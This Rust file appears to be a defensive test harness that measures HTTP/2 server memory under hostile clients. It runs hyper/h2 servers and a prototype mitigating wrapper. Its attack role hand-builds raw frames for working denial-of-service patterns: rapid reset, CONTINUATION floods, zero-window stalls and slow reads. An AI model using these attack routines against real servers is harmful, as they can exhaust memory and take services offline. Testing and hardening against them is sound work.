//! q2-009 window-0 / send-buffer stall harness.
//!
//! Three roles in one binary:
//!   server  --impl <hyper-baseline|h2-baseline|h2-wrapper> --port P [--body-mib N]
//!   attack  --port P --conns C --streams S --hold-ms H --init-win W --shape <...>
//!   sample  --pid P --ms M --dur-ms D        (prints CSV: t_ms,rss_kib,threads)
//!
//! The server advertises the GOLDEN h2 settings (ARCHITECTURE §3.1 l5-config-pin-table-transport).
//! The hostile client writes raw HTTP/2 frames by hand over cleartext TCP (h2c prior knowledge; TLS is
//! orthogonal to the framing/flow-control/buffer behaviour under test and adds only a few KiB/conn).
//!
//! Verdict arbiter is server RSS (/proc). Body chunks are FRESH heap allocations so that bytes buffered
//! inside h2 show up as real RSS (a shared static Bytes would be refcounted and hide the cost).

use std::future::poll_fn;
use std::sync::Arc;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

use bytes::Bytes;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};

// ---- golden transport settings ---------------------------------------------------------------
const MAX_CONCURRENT_STREAMS: u32 = 100;
const STREAM_WINDOW: u32 = 256 * 1024; // 256 KiB
const CONN_WINDOW: u32 = 1024 * 1024; // 1 MiB
const MAX_FRAME: u32 = 16384;
const MAX_HEADER_LIST: u32 = 16384;
const SEND_BUFFER: usize = 400 * 1024; // 400 KiB per stream
const MAX_PENDING_ACCEPT_RESET: usize = 20;

const CHUNK: usize = 16 * 1024; // 16 KiB body chunk
// wrapper budgets (AEGIS wrapper; hyper/h2 lack these)
// TBI-7 per-connection memory target M_CONN = 16 MiB; the data ledger budget (--ledger-mib, default 12)
// leaves headroom for fixed per-stream state.
const STALL_MS: u64 = 10_000; // TBI-8 no progress > 10 s -> reap
const IDLE_MS: u64 = 30_000; // TBI-8 idle connection closed at 30 s

// global gauges (server process): live body streams, body bytes handed to h2/hyper, bytes written to sockets
static LIVE_STREAMS: AtomicU64 = AtomicU64::new(0);
static LIVE_CONNS: AtomicU64 = AtomicU64::new(0);
static HANDED: AtomicU64 = AtomicU64::new(0);
static WRITTEN: AtomicU64 = AtomicU64::new(0);
static REAPED: AtomicU64 = AtomicU64::new(0);
static MAX_CONN_LEDGER: AtomicU64 = AtomicU64::new(0);

/// Per-connection byte counters: buffered-in-stack = handed - written (frame headers make this a slight
/// under-estimate: 9 B per 16 KiB frame).
#[derive(Default)]
struct ConnCounters {
    handed: AtomicU64,
    written: AtomicU64,
}
impl ConnCounters {
    fn buffered(&self) -> u64 {
        self.handed.load(Ordering::Relaxed).saturating_sub(self.written.load(Ordering::Relaxed))
    }
    fn hand(&self, n: u64) {
        self.handed.fetch_add(n, Ordering::Relaxed);
        HANDED.fetch_add(n, Ordering::Relaxed);
        let b = self.buffered();
        MAX_CONN_LEDGER.fetch_max(b, Ordering::Relaxed);
    }
}

struct CountingIo {
    inner: TcpStream,
    c: Arc<ConnCounters>,
}
impl tokio::io::AsyncRead for CountingIo {
    fn poll_read(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &mut tokio::io::ReadBuf<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut self.inner).poll_read(cx, buf)
    }
}
impl tokio::io::AsyncWrite for CountingIo {
    fn poll_write(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &[u8],
    ) -> std::task::Poll<std::io::Result<usize>> {
        let r = std::pin::Pin::new(&mut self.inner).poll_write(cx, buf);
        if let std::task::Poll::Ready(Ok(n)) = &r {
            self.c.written.fetch_add(*n as u64, Ordering::Relaxed);
            WRITTEN.fetch_add(*n as u64, Ordering::Relaxed);
        }
        r
    }
    fn poll_flush(mut self: std::pin::Pin<&mut Self>, cx: &mut std::task::Context<'_>) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut self.inner).poll_flush(cx)
    }
    fn poll_shutdown(mut self: std::pin::Pin<&mut Self>, cx: &mut std::task::Context<'_>) -> std::task::Poll<std::io::Result<()>> {
        std::pin::Pin::new(&mut self.inner).poll_shutdown(cx)
    }
}

struct Gauge<'a>(&'a AtomicU64);
impl<'a> Gauge<'a> {
    fn up(a: &'a AtomicU64) -> Self {
        a.fetch_add(1, Ordering::Relaxed);
        Gauge(a)
    }
}
impl Drop for Gauge<'_> {
    fn drop(&mut self) {
        self.0.fetch_sub(1, Ordering::Relaxed);
    }
}

fn fresh_chunk(n: usize) -> Bytes {
    Bytes::from(vec![0xA5u8; n]) // non-zero: force resident pages (calloc zero pages would hide RSS)
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let role = args.get(1).cloned().unwrap_or_default();
    let rt = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(4)
        .enable_all()
        .build()
        .expect("runtime");
    let code = rt.block_on(async move {
        match role.as_str() {
            "server" => run_server(&args).await,
            "attack" => run_attack(&args).await,
            "sample" => run_sample(&args).await,
            _ => {
                eprintln!("usage: q2009 <server|attack|sample> ...");
                1
            }
        }
    });
    std::process::exit(code);
}

fn opt<'a>(args: &'a [String], key: &str) -> Option<&'a str> {
    args.iter().position(|a| a == key).and_then(|i| args.get(i + 1)).map(|s| s.as_str())
}

// ================================================================================================
// SERVER
// ================================================================================================
async fn run_server(args: &[String]) -> i32 {
    let implv = opt(args, "--impl").unwrap_or("h2-baseline").to_string();
    let port: u16 = opt(args, "--port").and_then(|s| s.parse().ok()).unwrap_or(8009);
    let body_mib: usize = opt(args, "--body-mib").and_then(|s| s.parse().ok()).unwrap_or(64);
    let body_bytes = body_mib * 1024 * 1024;

    let listener = match TcpListener::bind(("127.0.0.1", port)).await {
        Ok(l) => l,
        Err(e) => {
            eprintln!("bind failed: {e}");
            return 1;
        }
    };
    let ledger_mib: u64 = opt(args, "--ledger-mib").and_then(|s| s.parse().ok()).unwrap_or(12);
    let ledger_budget = ledger_mib * 1024 * 1024;
    println!("PID {}", std::process::id());
    println!("READY {port} impl={implv} ledger_mib={ledger_mib}");
    // stats line every 500 ms on stderr: t_ms,conns,streams,buffered_kib_total,max_conn_buffered_kib,reaped
    tokio::spawn(async {
        let start = Instant::now();
        loop {
            tokio::time::sleep(Duration::from_millis(500)).await;
            let b = HANDED.load(Ordering::Relaxed).saturating_sub(WRITTEN.load(Ordering::Relaxed));
            eprintln!(
                "STAT {},{},{},{},{},{}",
                start.elapsed().as_millis(),
                LIVE_CONNS.load(Ordering::Relaxed),
                LIVE_STREAMS.load(Ordering::Relaxed),
                b / 1024,
                MAX_CONN_LEDGER.load(Ordering::Relaxed) / 1024,
                REAPED.load(Ordering::Relaxed)
            );
        }
    });

    loop {
        let (sock, _) = match listener.accept().await {
            Ok(x) => x,
            Err(_) => continue,
        };
        let _ = sock.set_nodelay(true);
        let implv = implv.clone();
        tokio::spawn(async move {
            match implv.as_str() {
                "hyper-baseline" => serve_hyper(sock, body_bytes).await,
                "h2-wrapper" => serve_h2(sock, body_bytes, true, ledger_budget).await,
                _ => serve_h2(sock, body_bytes, false, ledger_budget).await,
            }
        });
    }
}

// ---- h2-direct server (baseline and wrapper) --------------------------------------------------
async fn serve_h2(sock: TcpStream, body_bytes: usize, wrapper: bool, ledger_budget: u64) {
    let _g = Gauge::up(&LIVE_CONNS);
    let counters = Arc::new(ConnCounters::default());
    let sock = CountingIo { inner: sock, c: counters.clone() };
    let mut builder = h2::server::Builder::new();
    builder
        .max_concurrent_streams(MAX_CONCURRENT_STREAMS)
        .initial_window_size(STREAM_WINDOW)
        .initial_connection_window_size(CONN_WINDOW)
        .max_frame_size(MAX_FRAME)
        .max_header_list_size(MAX_HEADER_LIST)
        .max_send_buffer_size(SEND_BUFFER)
        .max_pending_accept_reset_streams(MAX_PENDING_ACCEPT_RESET);

    let mut conn = match builder.handshake::<_, Bytes>(sock).await {
        Ok(c) => c,
        Err(_) => return,
    };

    // per-connection memory ledger = counters.buffered() (bytes handed to h2, not yet written to the socket)
    let last_activity = Arc::new(AtomicU64::new(now_ms()));

    loop {
        let accept = conn.accept();
        let next = if wrapper {
            // race accept against the idle deadline
            let idle_left = IDLE_MS.saturating_sub(now_ms().saturating_sub(last_activity.load(Ordering::Relaxed)));
            match tokio::time::timeout(Duration::from_millis(idle_left.max(1)), accept).await {
                Ok(v) => v,
                Err(_) => {
                    // idle: no new stream and (checked) no progress -> close connection (TBI-8)
                    if now_ms().saturating_sub(last_activity.load(Ordering::Relaxed)) >= IDLE_MS {
                        return; // drop conn
                    }
                    continue;
                }
            }
        } else {
            accept.await
        };

        let Some(result) = next else { return };
        let (_req, respond) = match result {
            Ok(x) => x,
            Err(_) => return,
        };
        last_activity.store(now_ms(), Ordering::Relaxed);
        let c = counters.clone();
        let la = last_activity.clone();
        tokio::spawn(async move {
            let _s = Gauge::up(&LIVE_STREAMS);
            if wrapper {
                send_body_wrapper(respond, body_bytes, c, ledger_budget, la).await;
            } else {
                send_body_baseline(respond, body_bytes, c).await;
            }
        });
    }
}

// Baseline sender: correct poll_capacity backpressure, NO ledger, NO stall reap.
// Under a non-draining client this fills h2's per-stream send buffer (<=SEND_BUFFER) and then parks
// FOREVER (TBI-8 violation: the stream is never reaped).
async fn send_body_baseline(mut respond: h2::server::SendResponse<Bytes>, body_bytes: usize, c: Arc<ConnCounters>) {
    let resp = http::Response::builder().status(200).body(()).unwrap_or_default();
    let mut send = match respond.send_response(resp, false) {
        Ok(s) => s,
        Err(_) => return,
    };
    let mut remaining = body_bytes;
    while remaining > 0 {
        let want = remaining.min(SEND_BUFFER);
        send.reserve_capacity(want);
        // spend already-assigned capacity first; poll_capacity only wakes on an increase
        let mut cap = send.capacity();
        if cap == 0 {
            cap = match poll_fn(|cx| send.poll_capacity(cx)).await {
                Some(Ok(c)) if c > 0 => c,
                Some(Ok(_)) => continue,
                _ => return,
            };
        }
        let n = cap.min(CHUNK).min(remaining);
        if send.send_data(fresh_chunk(n), false).is_err() {
            return;
        }
        c.hand(n as u64);
        remaining -= n;
    }
    let _ = send.send_data(Bytes::new(), true);
}

// Wrapper sender (prototype of the AEGIS wrapper): per-connection memory ledger (TBI-6/7) + per-stream
// 10 s stall deadline (TBI-8). The ledger is exact: bytes handed to h2 minus bytes h2 wrote to the socket.
// A chunk is handed to h2 only while ledger + chunk <= ledger_budget. Any stream that cannot make send
// progress (window, TCP backpressure, or ledger exhaustion) for STALL_MS is reset and dropped, which frees
// whatever h2 buffered for it.
async fn send_body_wrapper(
    mut respond: h2::server::SendResponse<Bytes>,
    body_bytes: usize,
    c: Arc<ConnCounters>,
    ledger_budget: u64,
    last_activity: Arc<AtomicU64>,
) {
    let resp = http::Response::builder().status(200).body(()).unwrap_or_default();
    let mut send = match respond.send_response(resp, false) {
        Ok(s) => s,
        Err(_) => return,
    };
    let mut remaining = body_bytes;
    let mut last_progress = Instant::now();
    let stall = Duration::from_millis(STALL_MS);

    while remaining > 0 {
        if last_progress.elapsed() >= stall {
            send.send_reset(h2::Reason::ENHANCE_YOUR_CALM);
            REAPED.fetch_add(1, Ordering::Relaxed);
            return; // dropping `send` lets h2 free this stream's buffered data
        }
        // ledger admission (before reserving, so h2 never holds more than the budget)
        if c.buffered() + CHUNK as u64 > ledger_budget {
            tokio::time::sleep(Duration::from_millis(20)).await;
            continue;
        }
        // same reservation pattern as the baseline (up to SEND_BUFFER) so the only difference is the ledger
        send.reserve_capacity(remaining.min(SEND_BUFFER));
        let mut cap = send.capacity();
        if cap == 0 {
            let left = stall.saturating_sub(last_progress.elapsed()).max(Duration::from_millis(1));
            cap = match tokio::time::timeout(left, poll_fn(|cx| send.poll_capacity(cx))).await {
                Ok(Some(Ok(c))) if c > 0 => c,
                Ok(Some(Ok(_))) => continue,
                Ok(_) => return,    // stream closed by peer
                Err(_) => continue, // deadline check at loop top
            };
        }
        // re-check after the await: other streams may have consumed the budget meanwhile
        if c.buffered() + CHUNK as u64 > ledger_budget {
            continue;
        }
        let n = cap.min(CHUNK).min(remaining);
        if send.send_data(fresh_chunk(n), false).is_err() {
            return;
        }
        c.hand(n as u64);
        remaining -= n;
        last_progress = Instant::now();
        last_activity.store(now_ms(), Ordering::Relaxed);
    }
    let _ = send.send_data(Bytes::new(), true);
}

// ---- hyper server (the actually-shipped stack) ------------------------------------------------
async fn serve_hyper(sock: TcpStream, body_bytes: usize) {
    use hyper::service::service_fn;
    use hyper_util::rt::{TokioExecutor, TokioIo, TokioTimer};

    let mut b = hyper::server::conn::http2::Builder::new(TokioExecutor::new());
    b.max_concurrent_streams(MAX_CONCURRENT_STREAMS)
        .initial_stream_window_size(STREAM_WINDOW)
        .initial_connection_window_size(CONN_WINDOW)
        .max_frame_size(MAX_FRAME)
        .max_header_list_size(MAX_HEADER_LIST)
        .max_send_buf_size(SEND_BUFFER)
        .max_pending_accept_reset_streams(MAX_PENDING_ACCEPT_RESET)
        .timer(TokioTimer::new())
        .keep_alive_interval(Duration::from_secs(20))
        .keep_alive_timeout(Duration::from_secs(20));

    let _g = Gauge::up(&LIVE_CONNS);
    let counters = Arc::new(ConnCounters::default());
    let io = CountingIo { inner: sock, c: counters.clone() };
    let svc = service_fn(move |_req| {
        let c = counters.clone();
        async move {
            LIVE_STREAMS.fetch_add(1, Ordering::Relaxed);
            Ok::<_, std::convert::Infallible>(hyper::Response::new(BigBody { remaining: body_bytes, c }))
        }
    });
    let _ = b.serve_connection(TokioIo::new(io), svc).await;
}

struct BigBody {
    remaining: usize,
    c: Arc<ConnCounters>,
}
impl Drop for BigBody {
    fn drop(&mut self) {
        LIVE_STREAMS.fetch_sub(1, Ordering::Relaxed);
    }
}
impl hyper::body::Body for BigBody {
    type Data = Bytes;
    type Error = std::convert::Infallible;
    fn poll_frame(
        mut self: std::pin::Pin<&mut Self>,
        _cx: &mut std::task::Context<'_>,
    ) -> std::task::Poll<Option<Result<hyper::body::Frame<Bytes>, Self::Error>>> {
        if self.remaining == 0 {
            return std::task::Poll::Ready(None);
        }
        let n = self.remaining.min(CHUNK);
        self.remaining -= n;
        self.c.hand(n as u64);
        std::task::Poll::Ready(Some(Ok(hyper::body::Frame::data(fresh_chunk(n)))))
    }
}

// ================================================================================================
// ATTACK — hand-written raw HTTP/2 frames
// ================================================================================================
fn frame_header(buf: &mut Vec<u8>, len: usize, ty: u8, flags: u8, stream: u32) {
    buf.push((len >> 16) as u8);
    buf.push((len >> 8) as u8);
    buf.push(len as u8);
    buf.push(ty);
    buf.push(flags);
    buf.extend_from_slice(&(stream & 0x7fff_ffff).to_be_bytes());
}

fn settings_frame(init_win: u32) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&4u16.to_be_bytes()); // SETTINGS_INITIAL_WINDOW_SIZE
    payload.extend_from_slice(&init_win.to_be_bytes());
    let mut f = Vec::new();
    frame_header(&mut f, payload.len(), 4, 0, 0);
    f.extend_from_slice(&payload);
    f
}
fn settings_ack() -> Vec<u8> {
    let mut f = Vec::new();
    frame_header(&mut f, 0, 4, 0x1, 0);
    f
}
fn window_update(stream: u32, inc: u32) -> Vec<u8> {
    let mut f = Vec::new();
    frame_header(&mut f, 4, 8, 0, stream);
    f.extend_from_slice(&(inc & 0x7fff_ffff).to_be_bytes());
    f
}
fn headers_get(stream: u32, end_headers: bool, end_stream: bool) -> Vec<u8> {
    // HPACK: :method GET (0x82), :scheme http (0x86), :path / (0x84),
    //        :authority localhost (literal, name idx 1)
    let mut block = vec![0x82u8, 0x86, 0x84, 0x41, 0x09];
    block.extend_from_slice(b"localhost");
    let mut flags = 0u8;
    if end_headers {
        flags |= 0x4;
    }
    if end_stream {
        flags |= 0x1;
    }
    let mut f = Vec::new();
    frame_header(&mut f, block.len(), 1, flags, stream);
    f.extend_from_slice(&block);
    f
}
fn rst_stream(stream: u32, code: u32) -> Vec<u8> {
    let mut f = Vec::new();
    frame_header(&mut f, 4, 3, 0, stream);
    f.extend_from_slice(&code.to_be_bytes());
    f
}
fn continuation(stream: u32, size: usize) -> Vec<u8> {
    // literal header field without indexing, new name "x", long value (never END_HEADERS)
    let mut block = Vec::new();
    while block.len() < size {
        block.push(0x00); // literal, no indexing, new name
        block.push(0x01);
        block.push(b'x');
        let vlen = 1000usize;
        block.push(0x7f); // 7-bit prefix cont (value len large): 0x7f then varint
        let mut v = vlen - 127;
        while v >= 128 {
            block.push((v as u8 & 0x7f) | 0x80);
            v >>= 7;
        }
        block.push(v as u8);
        block.extend(std::iter::repeat(b'a').take(vlen));
    }
    let mut f = Vec::new();
    frame_header(&mut f, block.len(), 9, 0, stream); // CONTINUATION, no END_HEADERS
    f.extend_from_slice(&block);
    f
}

const PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

async fn run_attack(args: &[String]) -> i32 {
    let port: u16 = opt(args, "--port").and_then(|s| s.parse().ok()).unwrap_or(8009);
    let conns: usize = opt(args, "--conns").and_then(|s| s.parse().ok()).unwrap_or(1);
    let streams: u32 = opt(args, "--streams").and_then(|s| s.parse().ok()).unwrap_or(100);
    let hold_ms: u64 = opt(args, "--hold-ms").and_then(|s| s.parse().ok()).unwrap_or(20_000);
    let init_win: u32 = opt(args, "--init-win").and_then(|s| s.parse().ok()).unwrap_or(0);
    let shape = opt(args, "--shape").unwrap_or("window0").to_string();

    let mut tasks = Vec::new();
    for _ in 0..conns {
        let shape = shape.clone();
        tasks.push(tokio::spawn(async move {
            one_conn(port, streams, hold_ms, init_win, &shape).await
        }));
    }
    for t in tasks {
        let _ = t.await;
    }
    println!("attack done shape={shape} conns={conns} streams={streams}");
    0
}

async fn one_conn(port: u16, streams: u32, hold_ms: u64, init_win: u32, shape: &str) {
    let Ok(mut sock) = TcpStream::connect(("127.0.0.1", port)).await else { return };
    let _ = sock.set_nodelay(true);
    // preface + our SETTINGS
    if sock.write_all(PREFACE).await.is_err() {
        return;
    }
    let iw = if shape == "bigwin-noread" || shape == "slowread" { init_win.max(16 * 1024 * 1024) } else { init_win };
    let _ = sock.write_all(&settings_frame(iw)).await;

    // read the server preface/SETTINGS once, then ACK (short bounded read)
    let mut tmp = [0u8; 4096];
    let _ = tokio::time::timeout(Duration::from_millis(300), sock.read(&mut tmp)).await;
    let _ = sock.write_all(&settings_ack()).await;

    if shape == "bigwin-noread" || shape == "slowread" {
        // raise the connection-level window so flow control is not the limit; the server will then
        // fill per-stream send buffers once we stop draining TCP.
        let _ = sock.write_all(&window_update(0, 0x3fff_0000)).await;
    }

    match shape {
        "rapidreset" => {
            // TBI-5: burst of open+immediate-reset
            for i in 0..streams {
                let sid = 1 + i * 2;
                let mut buf = headers_get(sid, true, true);
                buf.extend_from_slice(&rst_stream(sid, 0x8)); // CANCEL
                if sock.write_all(&buf).await.is_err() {
                    break;
                }
            }
            observe(&mut sock, hold_ms, "rapidreset").await;
        }
        "continuation" => {
            // TBI-1: HEADERS (no END_HEADERS) then CONTINUATION flood on stream 1
            let mut buf = headers_get(1, false, false);
            let _ = sock.write_all(&buf).await;
            buf.clear();
            for _ in 0..64 {
                if sock.write_all(&continuation(1, 15 * 1024)).await.is_err() { // < max_frame 16384
                    break;
                }
            }
            observe(&mut sock, hold_ms, "continuation").await;
        }
        _ => {
            // window0 / bigwin-noread / slowread: open all streams requesting the large response
            let mut buf = Vec::new();
            for i in 0..streams {
                let sid = 1 + i * 2;
                buf.extend_from_slice(&headers_get(sid, true, true));
            }
            let _ = sock.write_all(&buf).await;
            if shape == "slowread" {
                // drain TCP very slowly: ~1 KiB/s, and dribble tiny WINDOW_UPDATEs
                let deadline = Instant::now() + Duration::from_millis(hold_ms);
                let mut small = [0u8; 1024];
                while Instant::now() < deadline {
                    let _ = tokio::time::timeout(Duration::from_millis(900), sock.read(&mut small)).await;
                    let _ = sock.write_all(&window_update(0, 256)).await;
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
            } else {
                // window0 and bigwin-noread: do NOT read the socket at all; just hold it open
                hold(&mut sock, hold_ms).await;
            }
        }
    }
}

/// Read the server's frames until EOF or deadline; report RST_STREAM / GOAWAY (with error codes) and EOF.
async fn observe(sock: &mut TcpStream, hold_ms: u64, what: &str) {
    let deadline = Instant::now() + Duration::from_millis(hold_ms);
    let mut buf: Vec<u8> = Vec::new();
    let mut tmp = vec![0u8; 65536];
    let (mut rst, mut goaway, mut eof) = (0u32, Vec::<u32>::new(), false);
    let start = Instant::now();
    let mut first_goaway_ms = None;
    loop {
        let left = deadline.saturating_duration_since(Instant::now());
        if left.is_zero() {
            break;
        }
        match tokio::time::timeout(left, sock.read(&mut tmp)).await {
            Ok(Ok(0)) | Ok(Err(_)) => {
                eof = true;
                break;
            }
            Ok(Ok(n)) => buf.extend_from_slice(tmp.get(..n).unwrap_or(&[])),
            Err(_) => break,
        }
        // parse complete frames
        loop {
            if buf.len() < 9 {
                break;
            }
            let len = ((buf[0] as usize) << 16) | ((buf[1] as usize) << 8) | buf[2] as usize;
            if buf.len() < 9 + len {
                break;
            }
            let ty = buf[3];
            if ty == 3 {
                rst += 1;
            } else if ty == 7 && len >= 8 {
                goaway.push(u32::from_be_bytes([buf[13], buf[14], buf[15], buf[16]]));
                first_goaway_ms.get_or_insert(start.elapsed().as_millis());
            }
            buf.drain(..9 + len);
        }
    }
    println!("OBSERVE {what} rst_stream={rst} goaway_codes={goaway:?} first_goaway_ms={first_goaway_ms:?} eof={eof}");
    let _ = sock.shutdown().await;
}

async fn hold(sock: &mut TcpStream, hold_ms: u64) {
    // keep the connection open without draining response data
    tokio::time::sleep(Duration::from_millis(hold_ms)).await;
    let _ = sock.shutdown().await;
}

// ================================================================================================
// SAMPLE — server RSS over time
// ================================================================================================
async fn run_sample(args: &[String]) -> i32 {
    let pid: i32 = match opt(args, "--pid").and_then(|s| s.parse().ok()) {
        Some(p) => p,
        None => {
            eprintln!("--pid required");
            return 1;
        }
    };
    let ms: u64 = opt(args, "--ms").and_then(|s| s.parse().ok()).unwrap_or(250);
    let dur: u64 = opt(args, "--dur-ms").and_then(|s| s.parse().ok()).unwrap_or(30_000);
    println!("t_ms,rss_kib,threads");
    let start = Instant::now();
    loop {
        let el = start.elapsed().as_millis() as u64;
        if el > dur {
            break;
        }
        match read_status(pid) {
            Some((rss, th)) => println!("{el},{rss},{th}"),
            None => {
                println!("{el},-1,-1");
                break;
            }
        }
        tokio::time::sleep(Duration::from_millis(ms)).await;
    }
    0
}

fn read_status(pid: i32) -> Option<(u64, u64)> {
    let s = std::fs::read_to_string(format!("/proc/{pid}/status")).ok()?;
    let mut rss = 0u64;
    let mut th = 0u64;
    for line in s.lines() {
        if let Some(v) = line.strip_prefix("VmRSS:") {
            rss = v.trim().trim_end_matches(" kB").trim().parse().unwrap_or(0);
        } else if let Some(v) = line.strip_prefix("Threads:") {
            th = v.trim().parse().unwrap_or(0);
        }
    }
    Some((rss, th))
}

fn now_ms() -> u64 {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_millis() as u64).unwrap_or(0)
}
